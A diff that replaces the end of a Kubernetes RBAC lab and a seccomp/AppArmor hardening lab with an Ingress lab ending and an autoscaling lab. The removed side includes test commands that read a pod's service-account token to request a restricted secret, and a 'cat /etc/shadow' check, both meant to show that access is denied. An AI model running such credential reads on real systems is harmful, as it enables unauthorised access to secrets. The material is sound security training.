-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-curl -H "Authorization: Bearer $TOKEN" --cacert $CACERT https://kubernetes.default.svc/api/v1/namespaces/secure-app/secrets/restricted-secret
-'
-
-Expected Result: The first two commands should succeed, while the third should return a 403 Forbidden error.
-Subtask 3.4: Test Cross-Namespace Access Restrictions
-
-    Try to access resources in the default namespace:
-
-kubectl exec -it custom-sa-pod -n secure-app -- bash -c '
-TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-curl -H "Authorization: Bearer $TOKEN" --cacert $CACERT https://kubernetes.default.svc/api/v1/namespaces/default/pods
-'
-
-Expected Result: This should fail with a 403 Forbidden error, demonstrating namespace isolation.
-Task 4: Verify and Troubleshoot RBAC Configuration
-Subtask 4.1: Use kubectl auth Commands for Verification
-
-    Check what the custom service account can do:
-
-kubectl auth can-i --list --as=system:serviceaccount:secure-app:app-service-account -n secure-app
-
-    Test specific permissions:
-
-kubectl auth can-i get configmaps --as=system:serviceaccount:secure-app:app-service-account -n secure-app
-kubectl auth can-i get secrets --as=system:serviceaccount:secure-app:app-service-account -n secure-app
-kubectl auth can-i delete pods --as=system:serviceaccount:secure-app:app-service-account -n secure-app
-
-    Check permissions for the developer user:
-
-kubectl auth can-i get pods --as=developer -n secure-app
-kubectl auth can-i create pods --as=developer -n secure-app
-
-Subtask 4.2: Review RBAC Configuration
-
-    Display detailed information about roles:
-
-kubectl describe role pod-reader -n secure-app
-kubectl describe role app-minimal-role -n secure-app
-
-    Display detailed information about role bindings:
-
-kubectl describe rolebinding pod-reader-binding -n secure-app
-kubectl describe rolebinding app-service-binding -n secure-app
-
-Subtask 4.3: Common Troubleshooting Steps
-
-    Check for typos in resource names:
-
-kubectl get roles,rolebindings -n secure-app
-
-    Verify service account exists:
-
-kubectl get serviceaccounts -n secure-app
-
-    Check Pod service account assignment:
-
-kubectl get pod custom-sa-pod -n secure-app -o yaml | grep serviceAccount
+# Perform load test on app2
+ab -n 100 -c 10 -k https://myapps.local/app2
 
 Troubleshooting Tips
 Common Issues and Solutions
 
-Issue: 403 Forbidden errors when testing API access Solution:
+Issue 1: Ingress Controller Not Ready
 
-    Verify the RoleBinding is correctly configured
-    Check that the service account name matches exactly
-    Ensure you're testing in the correct namespace
+# Check ingress controller status
+kubectl get pods -n ingress-nginx
+kubectl describe pod -n ingress-nginx -l app.kubernetes.io/component=controller
 
-Issue: Service account token not found in Pod Solution:
+# Restart ingress controller if needed
+kubectl delete pod -n ingress-nginx -l app.kubernetes.io/component=controller
 
-    Verify the service account exists in the same namespace as the Pod
-    Check that the Pod specification includes the correct serviceAccountName
+Issue 2: DNS Resolution Problems
 
-Issue: Role permissions not working as expected Solution:
+# Verify hosts file entries
+cat /etc/hosts | grep myapps
 
-    Review the Role definition for correct apiGroups, resources, and verbs
-    Use kubectl auth can-i commands to test specific permissions
-    Check for typos in resource names or API groups
+# Test DNS resolution
+nslookup myapps.local
+ping myapps.local
 
-Issue: Cross-namespace access when it shouldn't be allowed Solution:
+Issue 3: Certificate Issues
 
-    Verify you're using Roles (namespace-scoped) instead of ClusterRoles
-    Check that RoleBindings are created in the correct namespace
+# Check TLS secret
+kubectl describe secret myapps-tls-secret -n web-apps
+
+# Verify certificate validity
+openssl x509 -in tls.crt -noout -dates
+
+Issue 4: Service Not Accessible
+
+# Check service endpoints
+kubectl get endpoints -n web-apps
+
+# Test service directly
+kubectl port-forward -n web-apps svc/app1-service 8080:80
+curl http://localhost:8080
 
 Cleanup
 
-To clean up the resources created in this lab:
+When you're finished with the lab, clean up the resources:
 
-# Delete Pods
-kubectl delete pod default-sa-pod custom-sa-pod -n secure-app
+# Delete ingress resources
+kubectl delete ingress --all -n web-apps
 
-# Delete RBAC resources
-kubectl delete rolebinding pod-reader-binding app-service-binding -n secure-app
-kubectl delete role pod-reader app-minimal-role -n secure-app
+# Delete applications
+kubectl delete -f app1-deployment.yaml
+kubectl delete -f app2-deployment.yaml
 
-# Delete service account
-kubectl delete serviceaccount app-service-account -n secure-app
+# Delete TLS secret
+kubectl delete secret myapps-tls-secret -n web-apps
 
-# Delete test resources
-kubectl delete configmap app-config -n secure-app
-kubectl delete secret app-secret restricted-secret -n secure-app
+# Delete namespace
+kubectl delete namespace web-apps
 
-# Delete certificate signing request
-kubectl delete csr developer-csr
+# Remove hosts file entries
+sudo sed -i '/myapps.local/d' /etc/hosts
 
-# Delete namespace (this will delete all remaining resources in the namespace)
-kubectl delete namespace secure-app
+# Clean up certificate files
+rm -f tls.key tls.csr tls.crt
 
-# Clean up local files
-rm -f pod-reader-role.yaml pod-reader-binding.yaml app-minimal-role.yaml app-service-binding.yaml
-rm -f default-sa-pod.yaml custom-sa-pod.yaml
-rm -f developer.key developer.csr developer.crt
+# Clean up YAML files
+rm -f *.yaml test-ingress.sh
 
 Conclusion
 
-In this lab, you have successfully:
+Congratulations! You have successfully completed Lab 14: Advanced HTTP/S Routing with Ingress. In this lab, you accomplished several important tasks:
 
-• Implemented Role-Based Access Control (RBAC) by creating custom Roles with specific permissions limited to a single namespace • Configured Service Accounts with minimal required permissions following the principle of least privilege • Created and tested RoleBindings to associate users and service accounts with appropriate roles • Verified access restrictions by testing API calls from different service accounts and confirming that unauthorized actions are blocked • Learned troubleshooting techniques for RBAC configurations using kubectl auth commands
+Key Achievements:
 
-Why This Matters: RBAC is a critical security feature in Kubernetes that helps prevent unauthorized access to cluster resources. By implementing proper RBAC controls, you ensure that applications and users can only access the resources they need to function, reducing the attack surface and potential for security breaches. This is especially important in multi-tenant environments and is a key requirement for the Certified Kubernetes Security Specialist (CKS) certification.
+• Deployed Multiple Applications: You created two distinct web applications with different visual themes and deployed them in a Kubernetes cluster using Deployments and Services.
 
-The skills you've developed in this lab are essential for:
+• Configured Path-Based Routing: You implemented sophisticated HTTP routing rules using Kubernetes Ingress resources, allowing different applications to be accessed via different URL paths (/app1, /app2).
 
-    Securing production Kubernetes clusters
-    Implementing compliance requirements
-    Following security best practices
-    Preparing for advanced Kubernetes security certifications
+• Implemented SSL/TLS Security: You generated self-signed certificates, created Kubernetes TLS secrets, and configured HTTPS termination at the Ingress level, ensuring secure communication.
 
-Remember to always apply the principle of least privilege when configuring RBAC in production environments, and regularly audit your RBAC configurations to ensure they remain appropriate as your applications and requirements evolve.
+• Advanced Routing Features: You explored advanced Ingress features including custom headers, multiple hostnames, and automatic HTTP-to-HTTPS redirects.
+
+• Verification and Testing: You performed comprehensive testing using various tools and methods to verify that routing rules work correctly and SSL termination functions properly.
+
+Why This Matters:
+
+Ingress controllers are crucial components in modern Kubernetes deployments because they:
+
+    Provide External Access: Enable external users to access applications running inside the cluster
+    Centralize Traffic Management: Offer a single point of control for HTTP/HTTPS traffic routing
+    Enable SSL Termination: Handle certificate management and encryption/decryption at the edge
+    Support Advanced Features: Provide load balancing, path rewriting, and custom headers
+    Reduce Complexity: Eliminate the need for multiple LoadBalancer services
+
+Real-World Applications:
+
+The skills you've learned are directly applicable to:
+
+    Microservices Architecture: Routing traffic to different services based on URL paths
+    Multi-Tenant Applications: Serving different customers via different hostnames
+    API Gateway Patterns: Managing API traffic and implementing security policies
+    Blue-Green Deployments: Routing traffic between different application versions
+    Development Environments: Providing easy access to multiple applications in development clusters
+
+This lab has provided you with practical experience in managing HTTP/HTTPS traffic in Kubernetes environments, a critical skill for the Kubernetes and Cloud Native Associate (KCNA) certification and real-world container orchestration scenarios.
 
 
 
 
-
-Lab 3: System Hardening with seccomp and AppArmor
+Lab 15: Implementing Autoscaling in Kubernetes
 Objectives
 
 By the end of this lab, you will be able to:
 
-• Understand the fundamentals of seccomp (secure computing mode) and AppArmor security frameworks • Configure and apply seccomp profiles to restrict system calls in Kubernetes Pods • Create and implement AppArmor profiles to control file and process access • Verify security profile enforcement through practical testing • Troubleshoot common issues with security profile implementation • Apply security hardening best practices in containerized environments
+• Understand the concepts of Horizontal Pod Autoscaler (HPA) and Vertical Pod Autoscaler (VPA) • Configure and deploy a Horizontal Pod Autoscaler for automatic scaling based on CPU utilization • Generate synthetic traffic to trigger autoscaling behavior • Monitor and observe scaling events in real-time • Implement Vertical Pod Autoscaler to automatically adjust resource requests and limits • Analyze the differences between horizontal and vertical scaling strategies • Troubleshoot common autoscaling issues and optimize performance
 Prerequisites
 
 Before starting this lab, you should have:
 
-• Basic understanding of Linux operating systems and command-line interface • Fundamental knowledge of Kubernetes concepts (Pods, containers, YAML manifests) • Familiarity with container security concepts • Basic understanding of Linux file permissions and process management • Knowledge of YAML syntax and structure
-Lab Environment Setup
+• Basic understanding of Kubernetes concepts (Pods, Deployments, Services) • Familiarity with kubectl command-line tool • Knowledge of YAML configuration files • Understanding of CPU and memory resource concepts • Basic Linux command-line skills
+Ready-to-Use Cloud Machines
 
-Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with all necessary tools installed. Simply click Start Lab to access your environment - no need to build your own VM or install additional software.
+Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes cluster already set up. Simply click Start Lab to access your environment. No need to build your own VM or install Kubernetes from scratch.
 
-Your lab environment includes: • Ubuntu 20.04 LTS with Kubernetes cluster • Docker runtime with seccomp support • AppArmor utilities pre-installed • kubectl configured and ready to use
-Task 1: Understanding and Configuring seccomp Profiles
-Subtask 1.1: Verify seccomp Support
+Your lab environment includes: • A running Kubernetes cluster with multiple nodes • kubectl configured and ready to use • Metrics server pre-installed for resource monitoring • All necessary tools for generating load and monitoring
+Task 1: Configure Horizontal Pod Autoscaler (HPA)
+Subtask 1.1: Create a Sample Application Deployment
 
-First, let's verify that your system supports seccomp and check the current configuration.
+First, we'll create a simple web application that we can scale automatically.
 
-    Check seccomp support in the kernel:
+    Create a deployment manifest file:
 
-grep CONFIG_SECCOMP /boot/config-$(uname -r)
-
-    Verify Docker seccomp support:
-
-docker info | grep -i seccomp
-
-    Check existing seccomp profiles:
-
-ls -la /var/lib/kubelet/seccomp/
-
-Subtask 1.2: Create a Custom seccomp Profile
-
-Now we'll create a restrictive seccomp profile that blocks potentially dangerous system calls.
-
-    Create a directory for seccomp profiles:
-
-sudo mkdir -p /var/lib/kubelet/seccomp/profiles
-
-    Create a restrictive seccomp profile:
-
-sudo tee /var/lib/kubelet/seccomp/profiles/restricted-profile.json > /dev/null << 'EOF'
-{
-    "defaultAction": "SCMP_ACT_ERRNO",
-    "architectures": [
-        "SCMP_ARCH_X86_64",
-        "SCMP_ARCH_X86",
-        "SCMP_ARCH_X32"
-    ],
-    "syscalls": [
-        {
-            "names": [
-                "accept",
-                "accept4",
-                "access",
-                "arch_prctl",
-                "bind",
-                "brk",
-                "capget",
-                "capset",
-                "chdir",
-                "chmod",
-                "chown",
-                "close",
-                "connect",
-                "dup",
-                "dup2",
-                "epoll_create",
-                "epoll_ctl",
-                "epoll_wait",
-                "execve",
-                "exit",
-                "exit_group",
-                "fcntl",
-                "fstat",
-                "futex",
-                "getcwd",
-                "getdents",
-                "getegid",
-                "geteuid",
-                "getgid",
-                "getgroups",
-                "getpeername",
-                "getpgrp",
-                "getpid",
-                "getppid",
-                "getrlimit",
-                "getsockname",
-                "getsockopt",
-                "getuid",
-                "listen",
-                "lseek",
-                "lstat",
-                "madvise",
-                "mmap",
-                "mprotect",
-                "munmap",
-                "nanosleep",
-                "open",
-                "openat",
-                "pipe",
-                "poll",
-                "prctl",
-                "read",
-                "readlink",
-                "rt_sigaction",
-                "rt_sigprocmask",
-                "rt_sigreturn",
-                "sched_getaffinity",
-                "sched_yield",
-                "select",
-                "set_robust_list",
-                "setgid",
-                "setgroups",
-                "setuid",
-                "socket",
-                "socketpair",
-                "stat",
-                "statfs",
-                "write"
-            ],
-            "action": "SCMP_ACT_ALLOW"
-        }
-    ]
-}
-EOF
-
-    Verify the profile was created:
-
-sudo cat /var/lib/kubelet/seccomp/profiles/restricted-profile.json | head -20
-
-Subtask 1.3: Deploy a Pod with seccomp Profile
-
-    Create a Pod manifest with seccomp profile:
-
-cat > seccomp-pod.yaml << 'EOF'
-apiVersion: v1
-kind: Pod
+cat > php-apache-deployment.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
 metadata:
-  name: seccomp-test-pod
+  name: php-apache
   labels:
-    app: seccomp-test
+    app: php-apache
 spec:
-  securityContext:
-    seccompProfile:
-      type: Localhost
-      localhostProfile: profiles/restricted-profile.json
-  containers:
-  - name: test-container
-    image: ubuntu:20.04
-    command: ["/bin/bash"]
-    args: ["-c", "while true; do echo 'Container running with seccomp profile'; sleep 30; done"]
-    securityContext:
-      allowPrivilegeEscalation: false
-      runAsNonRoot: true
-      runAsUser: 1000
-      capabilities:
-        drop:
-        - ALL
-  restartPolicy: Never
-EOF
-
-    Deploy the Pod:
-
-kubectl apply -f seccomp-pod.yaml
-
-    Verify the Pod is running:
-
-kubectl get pods seccomp-test-pod
-kubectl describe pod seccomp-test-pod
-
-Subtask 1.4: Test seccomp Profile Enforcement
-
-    Test allowed system calls:
-
-kubectl exec -it seccomp-test-pod -- /bin/bash -c "echo 'Testing allowed operations'; ls -la; pwd"
-
-    Test blocked system calls (this should fail):
-
-kubectl exec -it seccomp-test-pod -- /bin/bash -c "mount"
-
-    Check Pod logs for any seccomp violations:
-
-kubectl logs seccomp-test-pod
-
-Task 2: Implementing AppArmor Profiles
-Subtask 2.1: Verify AppArmor Status
-
-    Check AppArmor status:
-
-sudo apparmor_status
-
-    List available AppArmor profiles:
-
-sudo aa-status
-
-    Check if AppArmor is enabled in Kubernetes:
-
-kubectl get nodes -o jsonpath='{.items[*].status.nodeInfo.osImage}'
-
-Subtask 2.2: Create a Custom AppArmor Profile
-
-    Create an AppArmor profile directory:
-
-sudo mkdir -p /etc/apparmor.d/containers
-
-    Create a restrictive AppArmor profile:
-
-sudo tee /etc/apparmor.d/containers.restricted-container > /dev/null << 'EOF'
-#include <tunables/global>
-
-profile containers.restricted-container flags=(attach_disconnected,mediate_deleted) {
-  #include <abstractions/base>
-
-  # Deny dangerous capabilities
-  deny capability sys_admin,
-  deny capability sys_module,
-  deny capability sys_rawio,
-  deny capability sys_ptrace,
-
-  # Allow basic file operations in specific directories
-  /bin/** ix,
-  /usr/bin/** ix,
-  /lib/** ix,
-  /usr/lib/** ix,
-  /lib64/** ix,
-  /usr/lib64/** ix,
-
-  # Allow read access to system files
-  /etc/passwd r,
-  /etc/group r,
-  /etc/hostname r,
-  /etc/hosts r,
-  /etc/resolv.conf r,
-
-  # Allow access to proc and sys (limited)
-  /proc/*/stat r,
-  /proc/*/status r,
-  /proc/meminfo r,
-  /proc/cpuinfo r,
-  /sys/fs/cgroup/** r,
-
-  # Allow temporary files
-  /tmp/** rw,
-  /var/tmp/** rw,
-
-  # Allow home directory access (if running as user)
-  /home/** rw,
-
-  # Deny access to sensitive system directories
-  deny /boot/** rwklx,
-  deny /sys/** w,
-  deny /proc/sys/** w,
-  deny /etc/shadow r,
-  deny /etc/sudoers r,
-
-  # Network access
-  network inet tcp,
-  network inet udp,
-  network inet6 tcp,
-  network inet6 udp,
-
-  # Allow signal operations
-  signal (receive) set=(kill,term,int,hup,quit),
-}
-EOF
-
-    Load the AppArmor profile:
-
-sudo apparmor_parser -r /etc/apparmor.d/containers.restricted-container
-
-    Verify the profile is loaded:
-
-sudo aa-status | grep containers.restricted-container
-
-Subtask 2.3: Deploy a Pod with AppArmor Profile
-
-    Create a Pod manifest with AppArmor annotations:
-
-cat > apparmor-pod.yaml << 'EOF'
+  replicas: 1
+  selector:
+    matchLabels:
+      app: php-apache
+  template:
+    metadata:
+      labels:
+        app: php-apache
+    spec:
+      containers:
+      - name: php-apache
+        image: k8s.gcr.io/hpa-example
+        ports:
+        - containerPort: 80
+        resources:
+          limits:
+            cpu: 500m
+            memory: 128Mi
+          requests:
+            cpu: 200m
+            memory: 64Mi
+---
 apiVersion: v1
-kind: Pod
+kind: Service
 metadata:
-  name: apparmor-test-pod
-  annotations:
-    container.apparmor.security.beta.kubernetes.io/test-container: localhost/containers.restricted-container
+  name: php-apache
   labels:
-    app: apparmor-test
+    app: php-apache
 spec:
-  containers:
-  - name: test-container
-    image: ubuntu:20.04
-    command: ["/bin/bash"]
-    args: ["-c", "while true; do echo 'Container running with AppArmor profile'; sleep 30; done"]
-    securityContext:
-      allowPrivilegeEscalation: false
-      runAsNonRoot: true
-      runAsUser: 1000
-      capabilities:
-        drop:
-        - ALL
-  restartPolicy: Never
+  ports:
+  - port: 80
+    targetPort: 80
+  selector:
+    app: php-apache
+  type: ClusterIP
 EOF
 
-    Deploy the Pod:
+    Apply the deployment:
 
-kubectl apply -f apparmor-pod.yaml
+kubectl apply -f php-apache-deployment.yaml
 
-    Verify the Pod is running:
+    Verify the deployment is running:
 
-kubectl get pods apparmor-test-pod
-kubectl describe pod apparmor-test-pod
+kubectl get deployments
+kubectl get pods -l app=php-apache
 
-Subtask 2.4: Test AppArmor Profile Enforcement
+Subtask 1.2: Verify Metrics Server Installation
 
-    Test allowed operations:
+The HPA requires metrics server to function properly. Let's verify it's running:
 
-kubectl exec -it apparmor-test-pod -- /bin/bash -c "echo 'Testing allowed operations'; ls /tmp; echo 'test' > /tmp/testfile; cat /tmp/testfile"
+    Check if metrics server is installed:
 
-    Test blocked operations (these should fail):
+kubectl get deployment metrics-server -n kube-system
 
-# Try to access sensitive files
-kubectl exec -it apparmor-test-pod -- /bin/bash -c "cat /etc/shadow"
+    If metrics server is not running, install it:
 
-# Try to access boot directory
-kubectl exec -it apparmor-test-pod -- /bin/bash -c "ls /boot"
+kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml
 
-    Check AppArmor logs for violations:
+    Wait for metrics server to be ready:
 
-sudo dmesg | grep -i apparmor | tail -10
+kubectl wait --for=condition=available --timeout=300s deployment/metrics-server -n kube-system
 
-Task 3: Combining seccomp and AppArmor Profiles
-Subtask 3.1: Create a Hardened Pod with Both Profiles
+    Verify metrics are available:
 
-    Create a comprehensive Pod manifest:
+kubectl top nodes
+kubectl top pods
 
-cat > hardened-pod.yaml << 'EOF'
-apiVersion: v1
-kind: Pod
+Subtask 1.3: Create Horizontal Pod Autoscaler
+
+Now we'll create an HPA that scales based on CPU utilization.
+
+    Create the HPA using kubectl command:
+
+kubectl autoscale deployment php-apache --cpu-percent=50 --min=1 --max=10
+
+    Alternatively, create an HPA using YAML manifest:
+
+cat > hpa-config.yaml << 'EOF'
+apiVersion: autoscaling/v2
+kind: HorizontalPodAutoscaler
 metadata:
-  name: hardened-test-pod
-  annotations:
-    container.apparmor.security.beta.kubernetes.io/secure-container: localhost/containers.restricted-container
-  labels:
-    app: hardened-test
+  name: php-apache
 spec:
-  securityContext:
-    seccompProfile:
-      type: Localhost
-      localhostProfile: profiles/restricted-profile.json
-    runAsNonRoot: true
-    runAsUser: 1000
-    fsGroup: 1000
-  containers:
-  - name: secure-container
-    image: ubuntu:20.04
-    command: ["/bin/bash"]
-    args: ["-c", "while true; do echo 'Hardened container running'; sleep 30; done"]
-    securityContext:
-      allowPrivilegeEscalation: false
-      readOnlyRootFilesystem: false
-      runAsNonRoot: true
-      runAsUser: 1000
-      capabilities:
-        drop:
-        - ALL
-    resources:
-      limits:
-        memory: "128Mi"
-        cpu: "100m"
-      requests:
-        memory: "64Mi"
-        cpu: "50m"
-  restartPolicy: Never
+  scaleTargetRef:
+    apiVersion: apps/v1
+    kind: Deployment
+    name: php-apache
+  minReplicas: 1
+  maxReplicas: 10
+  metrics:
+  - type: Resource
+    resource:
+      name: cpu
+      target:
+        type: Utilization
+        averageUtilization: 50
+  behavior:
+    scaleDown:
+      stabilizationWindowSeconds: 300
+      policies:
+      - type: Percent
+        value: 10
+        periodSeconds: 60
+    scaleUp:
+      stabilizationWindowSeconds: 0
+      policies:
+      - type: Percent
+        value: 100
+        periodSeconds: 15
+      - type: Pods
+        value: 4
+        periodSeconds: 15
+      selectPolicy: Max
 EOF
 
-    Deploy the hardened Pod:
+    Apply the HPA configuration:
 
-kubectl apply -f hardened-pod.yaml
+kubectl apply -f hpa-config.yaml
 
-    Verify deployment:
+    Verify the HPA is created:
 
-kubectl get pods hardened-test-pod
-kubectl describe pod hardened-test-pod
+kubectl get hpa
+kubectl describe hpa php-apache
 
-Subtask 3.2: Comprehensive Security Testing
+Task 2: Generate Traffic to Observe Scaling Behavior
+Subtask 2.1: Create Load Generator Pod
 
-    Test basic functionality:
+We'll create a pod that generates continuous traffic to trigger autoscaling.
 
-kubectl exec -it hardened-test-pod -- /bin/bash -c "echo 'Basic test'; whoami; pwd"
+    Create a load generator pod:
 
-    Test file system restrictions:
+kubectl run -i --tty load-generator --rm --image=busybox --restart=Never -- /bin/sh
 
-# This should work (temporary files)
-kubectl exec -it hardened-test-pod -- /bin/bash -c "echo 'test data' > /tmp/secure-test.txt && cat /tmp/secure-test.txt"
+    Inside the load generator pod, run the following command to generate load:
 
-# This should fail (sensitive system files)
-kubectl exec -it hardened-test-pod -- /bin/bash -c "cat /etc/shadow"
+while true; do wget -q -O- http://php-apache; done
 
-    Test system call restrictions:
+Subtask 2.2: Monitor Scaling in Real-Time
 
-# This should fail (blocked system calls)
-kubectl exec -it hardened-test-pod -- /bin/bash -c "mount"
-kubectl exec -it hardened-test-pod -- /bin/bash -c "chroot /"
+Open a new terminal window and monitor the scaling behavior:
 
-    Monitor security violations:
+    Watch HPA status in real-time:
 
-# Check AppArmor violations
-sudo dmesg | grep -i apparmor | tail -5
+kubectl get hpa php-apache --watch
 
-# Check for any audit logs
-sudo journalctl -u kubelet | grep -i seccomp | tail -5
+    In another terminal, monitor pod scaling:
 
-Task 4: Verification and Monitoring
-Subtask 4.1: Create Monitoring Scripts
+kubectl get pods -l app=php-apache --watch
 
-    Create a security monitoring script:
+    Monitor resource usage:
 
-cat > monitor-security.sh << 'EOF'
-#!/bin/bash
+watch kubectl top pods -l app=php-apache
 
-echo "=== Security Profile Monitoring ==="
-echo
+Subtask 2.3: Observe Scaling Events
 
-echo "1. AppArmor Status:"
-sudo aa-status | grep containers.restricted-container
-echo
+    Check HPA events to see scaling decisions:
 
-echo "2. Recent AppArmor Violations:"
-sudo dmesg | grep -i apparmor | tail -3
-echo
+kubectl describe hpa php-apache
 
-echo "3. Pod Security Context:"
-kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext}{"\n"}{end}' | grep -E "(hardened|seccomp|apparmor)"
-echo
+    View deployment events:
 
-echo "4. Running Hardened Pods:"
-kubectl get pods -l app=hardened-test -o wide
-echo
+kubectl describe deployment php-apache
 
-echo "5. Security Annotations:"
-kubectl get pods hardened-test-pod -o jsonpath='{.metadata.annotations}' 2>/dev/null | grep -o 'container\.apparmor[^"]*'
-echo
+    Check cluster events:
+
+kubectl get events --sort-by=.metadata.creationTimestamp
+
+Subtask 2.4: Test Scale-Down Behavior
+
+    Stop the load generator by pressing Ctrl+C in the load generator terminal.
+
+    Monitor the scale-down process:
+
+kubectl get hpa php-apache --watch
+
+    Observe how pods are terminated:
+
+kubectl get pods -l app=php-apache --watch
+
+Task 3: Experiment with Vertical Pod Autoscaler (VPA)
+Subtask 3.1: Install Vertical Pod Autoscaler
+
+VPA is not installed by default, so we need to install it first.
+
+    Clone the VPA repository:
+
+git clone https://github.com/kubernetes/autoscaler.git
+cd autoscaler/vertical-pod-autoscaler/
+
+    Install VPA components:
+
+./hack/vpa-install.sh
+
+    Verify VPA installation:
+
+kubectl get pods -n kube-system | grep vpa
+
+Subtask 3.2: Create a VPA Configuration
+
+    First, remove the existing HPA to avoid conflicts:
+
+kubectl delete hpa php-apache
+
+    Create a VPA configuration:
+
+cat > vpa-config.yaml << 'EOF'
+apiVersion: autoscaling.k8s.io/v1
+kind: VerticalPodAutoscaler
+metadata:
+  name: php-apache-vpa
+spec:
+  targetRef:
+    apiVersion: apps/v1
+    kind: Deployment
+    name: php-apache
+  updatePolicy:
+    updateMode: "Auto"
+  resourcePolicy:
+    containerPolicies:
+    - containerName: php-apache
+      minAllowed:
+        cpu: 100m
+        memory: 50Mi
+      maxAllowed:
+        cpu: 1000m
+        memory: 500Mi
+      controlledResources: ["cpu", "memory"]
 EOF
 
-chmod +x monitor-security.sh
+    Apply the VPA configuration:
 
-    Run the monitoring script:
+kubectl apply -f vpa-config.yaml
 
-./monitor-security.sh
+    Verify VPA is created:
 
-Subtask 4.2: Performance Impact Assessment
+kubectl get vpa
+kubectl describe vpa php-apache-vpa
 
-    Create a performance test script:
+Subtask 3.3: Generate Load for VPA Testing
 
-cat > performance-test.sh << 'EOF'
-#!/bin/bash
+    Create a more intensive load generator:
 
-echo "=== Performance Impact Assessment ==="
-echo
-
-echo "Testing regular Pod performance..."
-kubectl run perf-test-regular --image=ubuntu:20.04 --restart=Never -- /bin/bash -c "time ls -la /usr/bin | wc -l; sleep 5"
-sleep 10
-
-echo "Testing hardened Pod performance..."
-kubectl exec hardened-test-pod -- /bin/bash -c "time ls -la /usr/bin | wc -l" 2>/dev/null || echo "Command restricted by security profiles"
-
-echo
-echo "Resource usage comparison:"
-kubectl top pods 2>/dev/null || echo "Metrics server not available"
-
-# Cleanup
-kubectl delete pod perf-test-regular --ignore-not-found=true
+cat > load-generator-deployment.yaml << 'EOF'
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: load-generator
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: load-generator
+  template:
+    metadata:
+      labels:
+        app: load-generator
+    spec:
+      containers:
+      - name: load-generator
+        image: busybox
+        command: ["/bin/sh"]
+        args: ["-c", "while true; do wget -q -O- http://php-apache; sleep 0.1; done"]
+        resources:
+          requests:
+            cpu: 100m
+            memory: 64Mi
 EOF
 
-chmod +x performance-test.sh
+    Deploy the load generator:
 
-    Run the performance test:
+kubectl apply -f load-generator-deployment.yaml
 
-./performance-test.sh
+Subtask 3.4: Monitor VPA Recommendations
+
+    Monitor VPA recommendations:
+
+kubectl describe vpa php-apache-vpa
+
+    Check the current resource usage:
+
+kubectl top pods -l app=php-apache
+
+    Watch for pod restarts as VPA applies new resource limits:
+
+kubectl get pods -l app=php-apache --watch
+
+    Compare resource requests before and after VPA adjustment:
+
+kubectl describe pod -l app=php-apache
+
+Subtask 3.5: Test VPA in Recommendation Mode
+
+    Create a VPA in recommendation-only mode:
+
+cat > vpa-recommend-only.yaml << 'EOF'
+apiVersion: autoscaling.k8s.io/v1
+kind: VerticalPodAutoscaler
+metadata:
+  name: php-apache-vpa-recommend
+spec:
+  targetRef:
+    apiVersion: apps/v1
+    kind: Deployment
+    name: php-apache
+  updatePolicy:
+    updateMode: "Off"
+  resourcePolicy:
+    containerPolicies:
+    - containerName: php-apache
+      minAllowed:
+        cpu: 100m
+        memory: 50Mi
+      maxAllowed:
+        cpu: 1000m
+        memory: 500Mi
+EOF
+
+    Apply the recommendation-only VPA:
+
+kubectl delete vpa php-apache-vpa
+kubectl apply -f vpa-recommend-only.yaml
+
+    View recommendations without automatic updates:
+
+kubectl describe vpa php-apache-vpa-recommend
+
+Task 4: Advanced Autoscaling Scenarios
+Subtask 4.1: Multi-Metric HPA
+
+Create an HPA that scales based on multiple metrics:
+
+cat > multi-metric-hpa.yaml << 'EOF'
+apiVersion: autoscaling/v2
+kind: HorizontalPodAutoscaler
+metadata:
+  name: php-apache-multi-metric
+spec:
+  scaleTargetRef:
+    apiVersion: apps/v1
+    kind: Deployment
+    name: php-apache
+  minReplicas: 2
+  maxReplicas: 15
+  metrics:
+  - type: Resource
+    resource:
+      name: cpu
+      target:
+        type: Utilization
+        averageUtilization: 60
+  - type: Resource
+    resource:
+      name: memory
+      target:
+        type: Utilization
+        averageUtilization: 70
+  behavior:
+    scaleDown:
+      stabilizationWindowSeconds: 300
+      policies:
+      - type: Pods
+        value: 1
+        periodSeconds: 60
+    scaleUp:
+      stabilizationWindowSeconds: 60
+      policies:
+      - type: Pods
+        value: 2
+        periodSeconds: 60
+EOF
+
+Subtask 4.2: Custom Metrics HPA
+
+For advanced scenarios, you can also scale based on custom metrics:
+
+cat > custom-metric-hpa.yaml << 'EOF'
+apiVersion: autoscaling/v2
+kind: HorizontalPodAutoscaler
+metadata:
+  name: php-apache-custom
+spec:
+  scaleTargetRef:
+    apiVersion: apps/v1
+    kind: Deployment
+    name: php-apache
+  minReplicas: 1
+  maxReplicas: 10
+  metrics:
+  - type: Resource
+    resource:
+      name: cpu
+      target:
+        type: Utilization
+        averageUtilization: 50
+  - type: Pods
+    pods:
+      metric:
+        name: http_requests_per_second
+      target:
+        type: AverageValue
+        averageValue: "1k"
+EOF
 
 Troubleshooting Common Issues
-Issue 1: seccomp Profile Not Loading
+Issue 1: HPA Shows "Unknown" Status
 
-Symptoms: Pod fails to start with seccomp-related errors
+Problem: HPA status shows "Unknown" for current metrics.
 
-Solutions:
+Solution:
 
-# Check if seccomp directory exists
-ls -la /var/lib/kubelet/seccomp/
+    Check if metrics server is running:
 
-# Verify profile syntax
-sudo cat /var/lib/kubelet/seccomp/profiles/restricted-profile.json | jq .
+kubectl get pods -n kube-system | grep metrics-server
 
-# Check kubelet logs
-sudo journalctl -u kubelet | grep seccomp
+    Verify pod resource requests are set:
 
-Issue 2: AppArmor Profile Not Enforcing
+kubectl describe deployment php-apache
 
-Symptoms: Restricted operations succeed when they should fail
+    Check metrics server logs:
 
-Solutions:
+kubectl logs -n kube-system deployment/metrics-server
 
-# Reload AppArmor profile
-sudo apparmor_parser -r /etc/apparmor.d/containers.restricted-container
+Issue 2: VPA Not Updating Resources
 
-# Check profile status
-sudo aa-status | grep containers.restricted-container
